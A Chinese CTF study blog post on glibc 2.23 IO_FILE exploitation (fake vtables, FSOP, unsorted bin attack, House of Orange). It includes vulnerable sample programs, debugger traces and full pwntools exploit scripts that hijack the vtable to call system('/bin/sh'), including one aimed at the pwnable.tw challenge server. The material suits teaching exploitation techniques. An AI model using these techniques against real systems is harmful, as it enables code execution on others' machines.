---
title: IO_FILE学习笔记
date: 2022-9-15 20:32:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---



跟着angelboy [这个视频](https://www.youtube.com/watch?v=_ZnnGZygnzE) 的节奏，学习一下文件利用的基本操作，ppt里有的内容全都不写了，直接看ppt吧。



## 0x01 IO_FILE入门：伪造vtable

example.c如下：

```c
#include<stdio.h>
#include<stdlib.h>

char buf[0x100] = {0};
FILE *fp;
int main(){
   fp = fopen("./file.txt", "rw");
   gets(buf);
   fclose(fp);
}
```

在glibc2.23下编译，[获取样例程序](/assets/file/baby_file)

为了方便调试，把PIE和ASLR关了

```sh
❯ cat /proc/sys/kernel/randomize_va_space
0
❯ checksec ./baby_file
[*] '/home/sirius/ctf/file_structure/baby_file'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'
```

程序很明显有一个缓冲区溢出，buf可以溢出，越界写到fp

利用思路就是越界写fp，使fp指向buf。因为buf是可以随意构造的，就可以随意的伪造file structure了。如下图，buf中全填A时，最后会call到一个fake vtable，fake vtable是AAAAAAAA。（file structure这些基础知识不讲了，这里只讲利用，不懂的去看angelboy的[材料1](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf)和[材料2](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique))

![image-20221206113503491](/assets/img/2022/image-20221206113503491.png)

于是poc如下：

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

r = process("./baby_file")

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

debug()
buf = 0x601060
p = 'a'*0x100 + p64(buf)
r.sendline(p)

r.interactive()
```

结果失败，没有控制RIP

```sh
*RAX  0x61616161
*RBX  0x601060 (buf) ◂— 0x6161616161616161 ('aaaaaaaa')
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x6161616161616161 ('aaaaaaaa')
*RDI  0x601060 (buf) ◂— 0x6161616161616161 ('aaaaaaaa')
*RSI  0x602348 ◂— 0xa /* '\n' */
*RBP  0x7fffffffe090 —▸ 0x400630 (__libc_csu_init) ◂— push   r15
*RSP  0x7fffffffe070 ◂— 0x0
*RIP  0x7ffff7a7a39c (fclose+300) ◂— cmp    r8, qword ptr [rdx + 8]
─────────────────────────────[ DISASM ]──────────────────────────────
 ► 0x7ffff7a7a39c <fclose+300>    cmp    r8, qword ptr [rdx + 8]
   0x7ffff7a7a3a0 <fclose+304>    je     fclose+370                <fclose+370>
    ↓
   0x7ffff7a7a3e2 <fclose+370>    add    dword ptr [rdx + 4], 1
   0x7ffff7a7a3e6 <fclose+374>    mov    edx, eax
   0x7ffff7a7a3e8 <fclose+376>    and    edx, 0x8000
   0x7ffff7a7a3ee <fclose+382>    test   ah, 0x20
```

如slide中所讲，需要先bypass掉`_lock`

### file structure中_lock的offset获取方法

```sh
pwndbg> p *(struct _IO_FILE_plus *) 0x7ffff7dd18e0   # 0x7ffff7dd18e0是stdin地址，如果只是算offset，不关心结构体里内容的话，这个地址可以随便写
$6 = {
  file = {
    _flags = -72540024,
    _IO_read_ptr = 0x602349 "",
    _IO_read_end = 0x602349 "",
    _IO_read_base = 0x602240 'a' <repeats 200 times>...,
    _IO_write_base = 0x602240 'a' <repeats 200 times>...,
    _IO_write_ptr = 0x602240 'a' <repeats 200 times>...,
    _IO_write_end = 0x602240 'a' <repeats 200 times>...,
    _IO_buf_base = 0x602240 'a' <repeats 200 times>...,
    _IO_buf_end = 0x603240 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}
pwndbg> p &(*(struct _IO_FILE_plus *) 0x7ffff7dd18e0)->file->_lock
$10 = (_IO_lock_t **) 0x7ffff7dd1968 <_IO_2_1_stdin_+136>
pwndbg> p/x 0x7ffff7dd1968-0x7ffff7dd18e0
$11 = 0x88
```

计算buf_addr开始，_lock的地址，然后两值一减就是offset了： `p &(*(struct _IO_FILE_plus *) buf_addr)->file->_lock`

当然每次打一长串还是挺麻烦的，如果有安装pwngdb插件的话，fp命令还是挺方便的

```sh
pwndbg> fp 0x601060
$13 = {
  file = {
    _flags = 1633771873,
    _IO_read_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_read_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_read_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_buf_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_buf_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_save_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_backup_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_save_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _markers = 0x6161616161616161,
    _chain = 0x6161616161616161,
    _fileno = 1633771873,
    _flags2 = 1633771873,
    _old_offset = 7016996765293437281,
    _cur_column = 24929,
    _vtable_offset = 97 'a',
    _shortbuf = "a",
    _lock = 0x6161616161616161,
    _offset = 7016996765293437281,
    _codecvt = 0x6161616161616161,
    _wide_data = 0x6161616161616161,
    _freeres_list = 0x6161616161616161,
    _freeres_buf = 0x6161616161616161,
    __pad5 = 7016996765293437281,
    _mode = 1633771873,
    _unused2 = 'a' <repeats 20 times>
  },
  vtable = 0x6161616161616161
}
pwndbg> p &$13->file->_lock
$14 = (_IO_lock_t **) 0x6010e8 <buf+136>
pwndbg> p/x 136
$15 = 0x88
```

于是修改poc：

```python
p = 'a'*0x88 + p64(buf+0x500)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x0
*RBX  0x601060 (buf) ◂— 'a`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x6161616161616161 ('aaaaaaaa')
*RDI  0x6161616161616161 ('aaaaaaaa')
*RSI  0x1
*RBP  0x0
*RSP  0x7fffffffdff0 ◂— 0x0
*RIP  0x7ffff7a91562 (free+34) ◂— mov    rax, qword ptr [rdi - 8]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a91562 <free+34>     mov    rax, qword ptr [rdi - 8]
   0x7ffff7a91566 <free+38>     lea    rsi, [rdi - 0x10]
   0x7ffff7a9156a <free+42>     test   al, 2
   0x7ffff7a9156c <free+44>     jne    free+96                <free+96>
    ↓
   0x7ffff7a915a0 <free+96>     mov    edx, dword ptr [rip + 0x33fbee] <mp_+52>
```

发现并没有**call [rax+0x10]**，会进入free

### 如何call [rax+0x10]?

实际运行流程图：

![file_structure.drawio](/assets/img/2022/file_structure.drawio.svg)



主要还是file structure中一些值的影响，改变了程序逻辑，使得没有做到预期的分支。

那么如何获得`call [rax+0x10]`呢，见上图所示

答案是原先payload中开头padding部分 `"a"*0x88` 改成 `"a".ljust(0x88, "\x00")`

poc改为：

```python
p = 'a'.ljust(0x88, '\x00') + p64(buf+0x500)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x2020202020202020 ('        ')
*RBX  0x601060 (buf) ◂— 0x61 /* 'a' */
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x601560 ◂— 0x0
*RDI  0x601060 (buf) ◂— 0x61 /* 'a' */
*RSI  0x0

*RBP  0xffffffff
*RSP  0x7fffffffe070 ◂— 0x0
*RIP  0x7ffff7a7a2ac (fclose+60) ◂— call   qword ptr [rax + 0x10]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a7a2ac <fclose+60>     call   qword ptr [rax + 0x10]

   0x7ffff7a7a2af <fclose+63>     mov    eax, dword ptr [rbx + 0xc0]
   0x7ffff7a7a2b5 <fclose+69>     test   eax, eax
   0x7ffff7a7a2b7 <fclose+71>     jle    fclose+496                <fclose+496>
```

成功控制了RIP

分析为什么可以获得`call [rax+0x10]`，`_IO_new_fclose`源码如下：

![image-20220922221007513](/assets/img/2022/image-20220922221007513.png)

所以关键是`_flags`这个值，会影响进不进`_IO_file_close_it`

还是见上图，第二种情况，payload是`'/bin/sh'.ljust(0x88, '\x00')`时，会获得一次`call [rax+0x88]`，这个是`vtable->_close`

poc：

```python
p = '/bin/sh'.ljust(0x88, '\x00') + p64(buf+0x50)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x2020202020202020 ('        ')
*RBX  0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x0
*RDI  0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RSI  0x1

*RBP  0x0
*RSP  0x7fffffffe050 —▸ 0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RIP  0x7ffff7a8696a (_IO_file_close_it+282) ◂— call   qword ptr [rax + 0x88]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a8696a <_IO_file_close_it+282>    call   qword ptr [rax + 0x88]

   0x7ffff7a86970 <_IO_file_close_it+288>    mov    ebp, eax
   0x7ffff7a86972 <_IO_file_close_it+290>    jmp    _IO_file_close_it+60                <_IO_file_close_it+60>

   0x7ffff7a86977 <_IO_file_close_it+295>    nop    word ptr [rax + rax]
```

`_IO_new_file_close_it`源码中的调用点如下：

![image-20220922223525729](/assets/img/2022/image-20220922223525729.png)

![image-20220922223611848](/assets/img/2022/image-20220922223611848.png)

我觉得输入/bin/sh开头的payload比较好利用

思路：

首先如上获得`call [rax+0x88]`，这个`rax`的地址是相对于buf偏移为`0xd8`的vtable。所以需要把vtable指到可以恶意构造的一块地方，称之为fake vtable。

然后再vtable+0x88的地址上写入system，由于此时rdi已经是/bin/sh了，所以直接可以拿到shell

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

r = process("./baby_file")

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

# debug()
buf = 0x601060
fake_vtable = buf+0x110
system_addr = 0x7ffff7a523a0 # PIE & ASLR off, only for debug 
p = '/bin/sh'.ljust(0x88, '\x00') + p64(buf+0x50) # bypass _lock
p = p.ljust(0xd8, '\x00') + p64(fake_vtable) # fake vtable
p = p.ljust(0x100, '\x00') + p64(buf) # overflow fp
p = p.ljust(0x110+0x88, '\x00') + p64(system_addr) # vtable->_close = system
r.sendline(p)

r.interactive()
```

## 0x02 pwnable.tw上的seethefile

file structure的构造基本和上面的入门题一模一样。程序有一个任意文件读取的功能，通过读取`proc/self/maps`获得libc地址

exp:

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# r = process('./seethefile')
# libc = ELF('/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')
r = remote('chall.pwnable.tw', 10200)
libc = ELF('./libc.so')

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

def my_open(filename):
    r.recvuntil("Your choice :")
    r.sendline('1')
    r.recvuntil("What do you want to see :")
    r.sendline(filename)

def my_read():
    r.recvuntil("Your choice :")
    r.sendline('2')

def my_write():
    r.recvuntil("Your choice :")
    r.sendline('3')

def my_close():
    r.recvuntil("Your choice :")
    r.sendline('4')

def my_exit(name):
    r.recvuntil("Your choice :")
    r.sendline('5')
    r.recvuntil("Leave your name :")
    r.sendline(name)

my_open('/proc/self/maps')
my_read()
my_write()

my_read()
my_write()
con = r.recvuntil('libc')
libc_addr = int(con.split('\n')[-1].split('-')[0], 16)
system_off = libc.symbols['system']
system_addr = libc_addr + system_off
log.success('libc_addr: 0x{:x}'.format(libc_addr))
log.success('system_addr: 0x{:x}'.format(system_addr))


# debug()
buf = 0x804b260 # size=0x20
fake_file_structure = buf+0x200
fake_vtable = buf+0x300
p = 'a'*0x20
p += p64(fake_file_structure)
p = p.ljust(0x200, '\x00') # padding to fake_file_structure
p += '/bin/sh'.ljust(0x48, '\x00') + p64(buf+0x500) # bypass _lock
p = p.ljust(0x200+0x94, '\x00') + p64(fake_vtable) # fake vtable
p = p.ljust(0x300+0x44, '\x00') # padding to fake vtable + 0x44
p += p64(system_addr) # vtable->_close

my_exit(p)
#r.sendline('cd /home/seethefile')  # 这几行IO不是很稳定
#r.sendline('./get_flag')
#r.sendline('Give me the flag')

r.interactive()
```

![image-20221207001822307](/assets/img/2022/image-20221207001822307.png)



## 0x03 IO_FILE入门：FSOP

fsop的利用就是如下图所示，劫持`_IO_list_all`，使其指向恶意构造的file structure,  恶意构造的file structure需要控制好`_chain`与`vtable`, 使得最终可以通过call vtable，实现`call system("/bin/sh")`

![image-20221208214530813](/assets/img/2022/image-20221208214530813.png)

而触发这个fp chain的时机呢，是通过触发`_IO_flush_all_lockp`，可以是

- glibc abort routine
- exit function
- main return

![image-20221208232041252](/assets/img/2022/image-20221208232041252.png)

在CTF题目中比较常见的场景是通过unsorted bin attack，劫持`_IO_list_all`，使其指向`bin (main_arena)`，file structure中`_chain`的偏移是0x68（64bit下），对应了`bin`中`smallbin[4]`的位置。

所以最终FSOP利用成功时，fp chain如下图所示。对于IO_FILE的FSOP的利用无非就是构造这样的一个fp chain，其实很简单。最终目的就是通过call vtable来实现call system("/bin/sh")。

![file_structure-FSOP.drawio](/assets/img/2022/file_structure-FSOP.drawio.svg)



达成FSOP需要满足的条件：[glibc源码](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L779)

```sh
fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
或者
_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)

满足上述条件后，会去执行
_IO_OVERFLOW (fp, EOF) == EOF
就会触发call vtable
```

通过一个小程序入门FSOP

magicalloc.c，使用glibc2.23编译，[程序获取](/assets/file/magicalloc)

```c
#include <alloca.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdlib.h>
#include <signal.h>

void init_proc(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}


long long read_long(){
    char buf[24];
    long long choice;
    __read_chk(0, buf, 23, 24);
    choice = atoll(buf);
    return choice;
}


void read_input(char *buf, unsigned int size){
    int ret;
    ret = __read_chk(0, buf, size, size);
    if (ret <= 0){
        puts("read error");
        _exit(1);
    }
    if (buf[ret-1] == '\n'){
        buf[ret-1] = '\x00';
    }
}


char name[0x20];
char *heap[5];
bool is_free = false;

void allocate(){
    size_t size;
    for (int i = 0; i < 5; i++){
        if (!heap[i]){
            printf("size: ");
            size = read_long();
            if (size < 0x78 || size > 0x1000){
                puts("too small or large");
                exit(-2);
            }
            heap[i] = malloc(size);
            if (!heap[i]){
                puts("error!");
            }
            return;
        }
        puts("too more!");
    }
}



void dfree(){
    unsigned int idx = 0;
    printf("Index: ");
    idx = read_long();
    if (idx < 5){
        free(heap[idx]);
        heap[idx] = NULL;
    }else{
        puts("too large");
    }
}


void edit(){
    unsigned int idx = 0;
    size_t size = 0;
    printf("index: ");
    idx = read_long();
    if (idx < 5){
        printf("size:");
        size = read_long();
        printf("data:");
        read_input(heap[idx], size);
    }else{
        puts("too large");
    }
}


void show(){
    unsigned int idx = 0;
    printf("index:");
    idx = read_long();

    if (idx < 5){
        if (heap[idx]){
            printf("name: %s\n", name);
            printf("context: %s\n", heap[idx]);
        }
    }else{
        puts("too large");
    }
}

void menu(){
    puts("*************************");
    puts("      magic allocate     ");
    puts("*************************");
    puts(" 1. alloc                ");
    puts(" 2. free                 ");
    puts(" 3. edit                 ");
    puts(" 4. show                 ");
    puts(" 5. exit                 ");
    puts("*************************");
    printf("your choice:");
}


int main(){
    init_proc();
    printf("name: ");
    read_input(name, 0x20);
    while(1){
        menu();
        switch(read_long()){
            case 1:
                allocate();
                break;
            case 2:
                if(!is_free){
                    dfree();
                }else{
                    puts("no more free!");
                }
                is_free = true;
                break;
            case 3:
                edit();
                break;
            case 4:
                show();
                break;
            case 5:
                exit(0);
                break;
        }
    }
}
```

```sh
❯ ldd magicalloc
        linux-vdso.so.1 (0x00007ffff7ffb000)
        libc.so.6 => /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 (0x00007ffff7806000)
        /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
❯ checksec ./magicalloc
[*] '/home/sirius/ctf/file_structure/magicalloc'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'
    FORTIFY:  Enabled
```

分析一下这个程序：

1. 因为name和heap变量挨着，通过塞满name，在show的时候可以顺带着leak出heap地址

2. edit函数很明显存在一个越界写，可以通过unsorted bin的fp leak出libc地址
3. 程序设定了只能free一次。在free过一个chunk进入unsorted bin后不能再free了（下面统称这个chunk为chunkA)
4. 可以通过越界写，构造实现FSOP的fp chain
5. 利用越界写，将chunkA的size修改为0x61，伪造成一个small bin[4]；将chunkA的bk改为`_IO_list_all-0x10`，构造unsorted bin attack；chunkA作为file structure，构造满足FSOP的条件：主要是`_IO_write_ptr > _IO_write_base`

6. 进行malloc，处理unsorted bin时会将chunkA 放入到smallbin[4]中，同时在对chunkA做unlink时，触发unsorted bin attack。将`_IO_list_all`指向`bin`，chunkA也已经构造好FSOP的条件了
7. 现在只需要触发`_IO_flush_all_lockp`，因为完成unsorted bin attack后，unsorted bin的bk会变成`&_IO_list_all-0x10`，如果把这片内存当做chunk，其chunk size是0，是非法的。所以在上一条进行malloc，处理unsorted bin时就会引发malloc异常，触发`malloc_printerr->_libc_message->abort->_IO_flush_all_lockp`
8. 最终拿到shell

**exp:**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

r = process("./magicalloc")
libc = ELF('/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

def alloc(size):
    r.recvuntil("your choice:")
    r.sendline('1')
    r.recvuntil("size:")
    r.sendline(str(size))

def free(index):
    r.recvuntil("your choice:")
    r.sendline('2')
    r.recvuntil("Index:")
    r.sendline(str(index))

def edit(index, size, data):
    r.recvuntil("your choice:")
    r.sendline('3')
    r.recvuntil("index:")
    r.sendline(str(index))
    r.recvuntil("size:")
    r.sendline(str(size))
    r.recvuntil("data:")
    r.sendline(data)

def show(index):
    r.recvuntil("your choice:")
    r.sendline('4')
    r.recvuntil("index:")
    r.sendline(str(index))

def exit():
    r.recvuntil("your choice:")
    r.sendline('5')

r.recvuntil("name:")
r.sendline('a'*0x20)
alloc(0x80) # 0
show(0)
r.recvuntil("a"*0x20)
heap_addr = u64(r.recvuntil("\n")[:-1].ljust(8, '\x00')) - 0x10
log.success('heap addr ===> 0x{:x}'.format(heap_addr))

alloc(0x80) #1
alloc(0x80) #2
free(1)

edit(0, 0x80+0x10, 'a'*0x90)
show(0)
r.recvuntil("a"*0x90)
libc_addr = u64(r.recvuntil("\n")[:-1].ljust(8, '\x00')) - 0x3c4b78
log.success('libc addr ===> 0x{:x}'.format(libc_addr))
system_off = libc.symbols['system']
system_addr = libc_addr + system_off


io_list_all_off = libc.symbols['_IO_list_all']
io_list_all_addr = libc_addr + io_list_all_off
fake_vtable = heap_addr + 0x300
p = 'a'*0x80 # padding to unsorted bin chunk
p += '/bin/sh\x00' + p64(0x61) # fake file structure, to smallbin[4], _chain
p += p64(0) # fd
p += p64(io_list_all_addr - 0x10) # bk, unsorted bin attack
p += p64(0) # _IO_write_base
p += p64(1) # _IO_write_ptr
p += '\x00'*(0xd8-0x30) # padding to vtable
p += p64(fake_vtable)
p = p.ljust(0x300-0x10, '\x00') # padding to fake_vtable
p += 'b'*0x18 # padding to vtable->_finish
p += p64(system_addr)
edit(0, len(p), p)

# debug("b *_IO_flush_all_lockp")

alloc(0x300)

r.interactive()
```

## 0x04 house of orange (glibc 2.23)

> File List:
>
> - [house_of_orange](/assets/file/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682)
> - [libc.so](/assets/file/libc.so.63751)

过于经典的题目，网上writeup也很多了

- https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
- https://veritas501.github.io/2017_12_13-IO_FILE_%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/

程序功能非常简单，漏洞点也很明显。edit的时候越界写，read没有添加NULL，可以做信息泄露。

程序非常特殊的点是没有**free**功能

该题要点：

- 通过glibc malloc的机制获取free功能
- 通过越界写，利用unsorted bin来leak libc和heap
- 通过越界写，实现FSOP（这里利用手法基本和**0x03**一模一样，所以不赘述了）



**关于第一点，如何通过glibc malloc机制获取free功能：**

malloc时，如果fastbin, unsorted bin, smallbin, large bin, top chunk都不能满足要求时，就会使用`sysmalloc`来malloc。对应了我画的malloc workflow中这种特殊情况。*sysmalloc还没画。找个时间把它画完*

![image-20221209001313083](/assets/img/2022/image-20221209001313083.png)

而`sysmalloc`中有一条路径，会触发`_int_free`，free掉top chunk，使得top chunk进入到unsorted bin。

上[源码](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2268)：

```c
  /*
     If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
   */

  if (av == NULL
      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
	  && (mp_.n_mmaps < mp_.n_mmaps_max)))
    {
      char *mm;           /* return value from mmap call*/
	  .....
      //这里是mmap分析        
```

> 这条分支不会触发`_int_free`，所以不可以满足这个if条件
>
> 这个分支是通过`mmap `来malloc，而另一个分支是通过`brk` 来malloc，另一个分支中会触发`_int_free`
>
> 这个if判断的是申请的大小 是否 大于mmap_threshold，也就是申请的size是否大于等于0x20000
>
> 显然我们申请的size应该要小于0x20000

```c
  old_top = av->top;
  old_size = chunksize (old_top);
  old_end = (char *) (chunk_at_offset (old_top, old_size));
  
  brk = snd_brk = (char *) (MORECORE_FAILURE);

  /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

  // bypass掉这个check
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

> 走brk分支，需要bypass这个check，top  chunk需要满足条件：
>
> 1. 大于MINSIZE(0x10)
> 2. 小于申请的size + MINSIZE(0x10)
> 3. prev inuse位是1
> 4. &old_top+old_size对齐到内存页， 也就是(&old_top+old_size) & 0xfff == 0

```c

/* If possible, release the rest. */
if (old_size >= MINSIZE)
{
    _int_free (av, old_top, 1);
}
}
```

> brk一顿操作之后，会调用`_int_free`把原先的top chunk free掉

**关于第二点，如何leak libc和heap**

假设目前unsorted bin中已经有chunkA了，`unsorted bin -> chunkA `

这时malloc一个chunk，size是large bin大小的，但又小于chunkA的size。此时glibc处理unsorted bin时，会将chunkA放入到large bin中，因为申请的size又小于这个large bin，所以会再从large bin中取出来，切割一下，剩余的再放回到unsorted bin中。这样一来一回，申请来的chunk就带回来large bin的fd/bk, fd_nextsize/bk_nextsize。因为fp/bk是unsorted bin中遗传来的，记录了main_arena的地址（获取了libc地址），fd_nextsize/bk_nextsize指向了heap段（获取了heap地址）

**所以该题思路：**

- 通过溢出修改top_chunk size，从而触发`sysmalloc`中的`_int_free`， 获取到unsorted bin

- 通过unsorted bin布置堆，leak heap和libc
- 再利用溢出，达成FSOP，拿到shell

该题内存布局：



exp：

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()
r = process("./houseoforange")
libc = ELF('/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def build(name_length, name, price=12, color=1):
    r.recvuntil("Your choice :")
    r.sendline('1')
    r.recvuntil("Length of name :")
    r.sendline(str(name_length))
    r.recvuntil("Name :")
    r.send(name)
    r.recvuntil("Price of Orange:")
    r.sendline(str(price))
    r.recvuntil("Color of Orange:")
    r.sendline(str(color))

def show():
    r.recvuntil("Your choice :")
    r.sendline('2')

def edit(name_length, name, price=12, color=1):
    r.recvuntil("Your choice :")
    r.sendline('3')
    r.recvuntil("Length of name :")
    r.sendline(str(name_length))
    r.recvuntil("Name:")
    r.send(name)
    r.recvuntil("Price of Orange:")
    r.sendline(str(price))
    r.recvuntil("Color of Orange:")
    r.sendline(str(color))

build(0x20, 'a')
p = 'a'*0x40 + p64(0) + p64(0xf91)
edit(len(p), p)
build(0x1000, 'b') # 最大就0x1000
build(0x400, 'c'*8)
show()
r.recvuntil("c"*8)
libc_addr = u64(r.recvuntil("\n")[:-1].ljust(8, '\x00')) - 0x3c5188
log.success('libc addr ===> 0x{:x}'.format(libc_addr))
edit(0x10, 'c'*0x10)
show()
r.recvuntil("c"*0x10)
heap_addr = u64(r.recvuntil("\n")[:-1].ljust(8, '\x00'))
log.success('heap addr ===> 0x{:x}'.format(heap_addr))

io_list_all_off = libc.symbols['_IO_list_all']
io_list_all_addr = libc_addr + io_list_all_off
fake_vtable = heap_addr + 0x600
system_off = libc.symbols['system']
system_addr = libc_addr + system_off
p = 'c'*0x420 # padding to unsorted bin chunk
p += '/bin/sh\x00' + p64(0x61) # fake file structure, to smallbin[4], _chain
p += p64(0) # fd
p += p64(io_list_all_addr - 0x10) # bk, unsorted bin attack
p += p64(0) # _IO_write_base
p += p64(1) # _IO_write_ptr
p += '\x00'*0xa8 # padding to vtable
p += p64(fake_vtable)
p = p.ljust(0x600-0x10, '\x00') # padding to fake_vtable
p += 'b'*0x18 # padding to vtable->_finish
p += p64(system_addr)
edit(len(p), p)

# debug("b *_IO_flush_all_lockp")
r.sendline('1')


r.interactive()
```

```sh
[*] Switching to interactive mode
 [DEBUG] Received 0x199 bytes:
    'Finish\n'
    '+++++++++++++++++++++++++++++++++++++\n'
    '@          House of Orange          @\n'
    '+++++++++++++++++++++++++++++++++++++\n'
    ' 1. Build the house                  \n'
    ' 2. See the house                    \n'
    ' 3. Upgrade the house                \n'
    ' 4. Give up                          \n'
    '+++++++++++++++++++++++++++++++++++++\n'
    "Your choice : *** Error in `./houseoforange': malloc(): memory corruption: 0x00007ffff7dd2520 ***\n"
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house
 2. See the house
 3. Upgrade the house
 4. Give up
+++++++++++++++++++++++++++++++++++++
Your choice : *** Error in `./houseoforange': malloc(): memory corruption: 0x00007ffff7dd2520 ***
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x24 bytes:
    'go.py  houseoforange  libc.so.63751\n'
go.py  houseoforange  libc.so.63751
$
```



## 0x05 house of orange (glibc 2.24)



## 0x06 WCTF 2017  wannaheap



## 0x07 HITCON 2017 : Ghost in The Heap



## 0x08 HCTF2017 babyprintf



## 0x09 House of Pig

###  **XCTF 2021 final**



## 0x10 house of apple

### pwn_oneday
